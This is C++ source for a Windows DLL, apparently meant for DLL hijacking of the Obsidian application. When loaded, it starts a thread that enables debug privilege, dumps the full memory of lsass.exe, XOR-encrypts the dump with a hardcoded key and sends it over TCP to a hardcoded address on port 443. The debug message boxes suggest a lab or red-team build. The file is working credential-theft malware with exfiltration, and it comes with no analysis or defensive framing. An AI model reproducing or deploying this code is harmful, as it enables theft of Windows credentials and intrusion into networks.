#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include "pch.h"
#include <tlhelp32.h>
#include <dbghelp.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Dbghelp.lib")
#pragma comment(lib, "Ws2_32.lib")

#define DUMP_BUFFER_SIZE (1024 * 1024 * 200)
const char* XOR_KEY = "jisjidpa123";
const char* DEST_IP = "192.168.10.94";
const int DEST_PORT = 443;

LPVOID dumpBuffer = NULL;
DWORD dumpSize = 0;

BOOL CALLBACK DumpCallbackRoutine(PVOID CallbackParam, const PMINIDUMP_CALLBACK_INPUT CallbackInput, PMINIDUMP_CALLBACK_OUTPUT CallbackOutput)
{
    switch (CallbackInput->CallbackType)
    {
    case IoStartCallback:
        CallbackOutput->Status = S_FALSE;
        break;
    case IoWriteAllCallback:
        memcpy((LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)CallbackInput->Io.Offset),
            CallbackInput->Io.Buffer,
            CallbackInput->Io.BufferBytes);
        dumpSize += CallbackInput->Io.BufferBytes;
        CallbackOutput->Status = S_OK;
        break;
    case IoFinishCallback:
        CallbackOutput->Status = S_OK;
        break;
    }
    return TRUE;
}

void XOR(char* data, int data_len, char* key, int key_len)
{
    for (int i = 0, j = 0; i < data_len; i++)
    {
        data[i] ^= key[j];
        j = (j + 1) % key_len;
    }
}

BOOL SetDebugPrivilege()
{
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES TokenPrivileges = { 0 };
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
        return FALSE;

    TokenPrivileges.PrivilegeCount = 1;
    TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &TokenPrivileges.Privileges[0].Luid))
    {
        CloseHandle(hToken);
        return FALSE;
    }

    if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
    {
        CloseHandle(hToken);
        return FALSE;
    }
    CloseHandle(hToken);
    return TRUE;
}

DWORD FindPID(const char* procname)
{
    PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32First(snapshot, &pe))
    {
        do
        {
            char szExeFile[MAX_PATH];
            WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, szExeFile, MAX_PATH, NULL, NULL);
            if (_stricmp(procname, szExeFile) == 0)
            {
                CloseHandle(snapshot);
                return pe.th32ProcessID;
            }
        } while (Process32Next(snapshot, &pe));
    }
    CloseHandle(snapshot);
    return 0;
}

BOOL TransferData(const char* data, DWORD size)
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return FALSE;

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET)
    {
        WSACleanup();
        return FALSE;
    }

    SOCKADDR_IN serverAddr = { 0 };
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(DEST_PORT);
    InetPtonA(AF_INET, DEST_IP, &serverAddr.sin_addr);

    if (connect(sock, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
    {
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }

    send(sock, (const char*)&size, sizeof(DWORD), 0);

    DWORD sent = 0;
    while (sent < size)
    {
        int chunk = min(4096, size - sent);
        int result = send(sock, data + sent, chunk, 0);
        if (result == SOCKET_ERROR)
        {
            closesocket(sock);
            WSACleanup();
            return FALSE;
        }
        sent += result;
    }

    closesocket(sock);
    WSACleanup();
    return TRUE;
}

DWORD WINAPI WorkerThread(LPVOID)
{
    // give Obsidian time to finish loading
    Sleep(5000);

    MessageBoxA(NULL, "Hijack DLL worker started", "Info", MB_OK);

    dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, DUMP_BUFFER_SIZE);
    if (!dumpBuffer)
        return 1;

    DWORD pid = FindPID("lsass.exe");
    if (!pid)
    {
        MessageBoxA(NULL, "Could not find lsass.exe", "Error", MB_OK);
        HeapFree(GetProcessHeap(), 0, dumpBuffer);
        return 1;
    }

    if (!SetDebugPrivilege())
    {
        MessageBoxA(NULL, "SeDebugPrivilege failed", "Error", MB_OK);
        HeapFree(GetProcessHeap(), 0, dumpBuffer);
        return 1;
    }

    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProc)
    {
        MessageBoxA(NULL, "OpenProcess failed", "Error", MB_OK);
        HeapFree(GetProcessHeap(), 0, dumpBuffer);
        return 1;
    }

    MINIDUMP_CALLBACK_INFORMATION CallbackInfo = { 0 };
    CallbackInfo.CallbackRoutine = DumpCallbackRoutine;

    if (!MiniDumpWriteDump(hProc, pid, NULL, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo))
    {
        MessageBoxA(NULL, "MiniDumpWriteDump failed", "Error", MB_OK);
        CloseHandle(hProc);
        HeapFree(GetProcessHeap(), 0, dumpBuffer);
        return 1;
    }
    CloseHandle(hProc);

    XOR((char*)dumpBuffer, dumpSize, (char*)XOR_KEY, (int)strlen(XOR_KEY));

    if (!TransferData((const char*)dumpBuffer, dumpSize))
    {
        MessageBoxA(NULL, "Transfer failed", "Error", MB_OK);
        HeapFree(GetProcessHeap(), 0, dumpBuffer);
        return 1;
    }

    HeapFree(GetProcessHeap(), 0, dumpBuffer);
    MessageBoxA(NULL, "Operation complete", "Info", MB_OK);

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hModule);

        MessageBoxA(NULL, "Obsidian DLL loaded, starting thread", "Info", MB_OK);

        HANDLE hThread = CreateThread(NULL, 0, WorkerThread, NULL, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}
